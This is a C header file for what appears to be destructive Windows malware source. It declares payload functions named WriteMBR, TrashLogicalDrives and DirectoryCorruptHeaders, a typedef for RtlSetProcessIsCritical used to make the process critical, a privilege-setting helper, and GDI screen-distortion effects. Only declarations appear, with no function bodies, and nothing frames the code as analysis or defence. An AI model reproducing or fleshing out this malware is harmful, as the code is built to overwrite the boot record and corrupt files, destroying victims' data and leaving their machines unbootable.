/* global headers */

#pragma once

#include "config.h"
#include <windows.h>

/* declarations */

#define IDICON 20
#define M_PI_F 3.14159265358979f
#define CARD(number) (number % 4) * 13 + (number/4)
#define haltandcatchfire() ExitProcess(EXIT_FAILURE)
#define RGB_RAND RGB(random() % 256, random() % 256, random() % 256)
#define random_r(greaterthan, lessthan) ((random() % (lessthan - greaterthan + 1)) + greaterthan)

typedef NTSTATUS(NTAPI *pfRtlSetProcessIsCritical) (BOOLEAN bNew, BOOLEAN *pbOld, BOOLEAN bNeedScb);

typedef struct {
	HWND dwh; /* desktop window handle */
	RECT dwd; /* desktop window dimensions */
	int dw; /* desktop width */
	int dh; /* desktop height */
} METRICS;

typedef struct {
	float Hue; /* hue in degrees */
	float Saturation; /* saturation multiplier */
	float Lightness; /* lightness multiplier */
} HSL;

typedef struct {
	BYTE Blue; /* blue value in range 0-255 */
	BYTE Green; /* green value in range 0-255 */
	BYTE Red; /* red value in range 0-255 */
	BYTE Reserved; /* reserved value: must be equal to 0 */
} RGB;

/* util.c */

int random(void);
float asmsin(float x);
float asmround(float x);
HSL RGBtoHSL(BYTE Red, BYTE Green, BYTE Blue);
RGB HSLtoRGB(float Hue, float Saturation, float Lightness);
BOOL ProcessSetPrivilege(LPCWSTR lpPrivilegeName, DWORD dwAttributes);

/* payload.c */

BOOL isok(void);
int WriteMBR(void);
int StartOperations(void);
int TrashLogicalDrives(void);
int DirectoryCorruptHeaders(LPWSTR lpDirectory);
LRESULT CALLBACK ButtonHookProc(int nCode, WPARAM wParam, LPARAM lParam);

/* gdi.c */

DWORD WINAPI Grayscale(LPVOID lParam);
DWORD WINAPI HueRotation(LPVOID lParam);
DWORD WINAPI ScreenMelter(LPVOID lParam);
DWORD WINAPI SolitaireCards(LPVOID lParam);

/* windows.c */

int WindowTrails();
DWORD WINAPI WindowFucker(LPVOID lParam);
DWORD WINAPI CreateHoleAroundCursor(LPVOID lParam);
BOOL CALLBACK WindowFuckerProc(HWND hwnd, LPARAM lParam);